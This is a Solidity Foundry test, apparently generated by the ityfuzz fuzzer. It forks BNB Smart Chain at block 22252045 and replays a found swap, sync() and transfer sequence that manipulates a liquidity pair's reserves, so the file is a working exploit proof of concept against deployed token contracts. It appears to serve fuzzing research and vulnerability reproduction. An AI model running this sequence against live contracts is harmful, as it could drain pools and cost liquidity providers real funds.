// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x55d398326f99059fF775485246999027B3197955,0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE,0x4397C76088db8f16C15455eB943Dd11F2DF56545,0x29b2525e11BC0B0E9E59f705F318601eA6756645 -c bsc --onchain-block-number 22252045 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
0x4397c76088db8f16c15455eb943dd11f2df56545, Reserves changed from (0x0000000000000000000000000000000000000000000037320f3f4e99931f8ae3_U256, 0x000000000000000000000000000000000000000000000f5e2be22a9e72c096fd_U256) to (0x0000000000000000000000000000000000000000000037320f3f4e99931f8ae3_U256, 0x0000000000000000000000000000000000000000000020a210fcd5ec47c3f097_U256)

================ Trace ================
[Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510
   └─[1] Router.swapExactETHForTokens{value: 521497.4123 Ether}(0, path:(WETH → 0x29b2525e11BC0B0E9E59f705F318601eA6756645), address(this), block.timestamp);
[Sender] 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb
   ├─[1] 0x4397C76088db8f16C15455eB943Dd11F2DF56545.sync()
   └─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0x4397C76088db8f16C15455eB943Dd11F2DF56545 → WETH), address(this), block.timestamp);
[Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510
   ├─[1] Router.swapExactETHForTokens{value: 10.0 Ether}(0, path:(WETH → 0x29b2525e11BC0B0E9E59f705F318601eA6756645), address(this), block.timestamp);
   ├─[1] 0x29b2525e11BC0B0E9E59f705F318601eA6756645.transfer(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, 4278201396)
   └─[1] Router.swapExactTokensForETH(100% Balance, 0, path:(0x29b2525e11BC0B0E9E59f705F318601eA6756645 → WETH), address(this), block.timestamp);


 */

contract C55d3 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 22252045);
    }

    function test() public {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        address[] memory path0 = new address[](2);
        path0[0] = weth;
        path0[1] = 0x29b2525e11BC0B0E9E59f705F318601eA6756645;
        vm.deal(0xe1A425f1AC34A8a441566f93c82dD730639c8510, 521497412382781699145838);
        IUniswapV2Router(router).swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 521497412382781699145838
        }(0, path0, address(this), block.timestamp);
        
        vm.prank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        IERC20(0x4397C76088db8f16C15455eB943Dd11F2DF56545).sync();
        
        vm.startPrank(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb);
        uint256 amount0 = IERC20(0x4397C76088db8f16C15455eB943Dd11F2DF56545).balanceOf(address(this));
        IERC20(0x4397C76088db8f16C15455eB943Dd11F2DF56545).approve(router, amount0);
        address[] memory liq_path0 = new address[](2);
        liq_path0[0] = 0x4397C76088db8f16C15455eB943Dd11F2DF56545;
        liq_path0[1] = address(weth);
        vm.deal(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, amount0);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount0, 0, liq_path0, address(this), block.timestamp
        );
        vm.stopPrank();
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        address[] memory path1 = new address[](2);
        path1[0] = weth;
        path1[1] = 0x29b2525e11BC0B0E9E59f705F318601eA6756645;
        vm.deal(0xe1A425f1AC34A8a441566f93c82dD730639c8510, 10000000000000000000);
        IUniswapV2Router(router).swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: 10000000000000000000
        }(0, path1, address(this), block.timestamp);
        
        vm.prank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        IERC20(0x29b2525e11BC0B0E9E59f705F318601eA6756645).transfer(0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, 4278201396);
        
        vm.startPrank(0xe1A425f1AC34A8a441566f93c82dD730639c8510);
        uint256 amount1 = IERC20(0x29b2525e11BC0B0E9E59f705F318601eA6756645).balanceOf(address(this));
        IERC20(0x29b2525e11BC0B0E9E59f705F318601eA6756645).approve(router, amount1);
        address[] memory liq_path1 = new address[](2);
        liq_path1[0] = 0x29b2525e11BC0B0E9E59f705F318601eA6756645;
        liq_path1[1] = address(weth);
        vm.deal(0xe1A425f1AC34A8a441566f93c82dD730639c8510, amount1);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount1, 0, liq_path1, address(this), block.timestamp
        );
        vm.stopPrank();
    }

}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
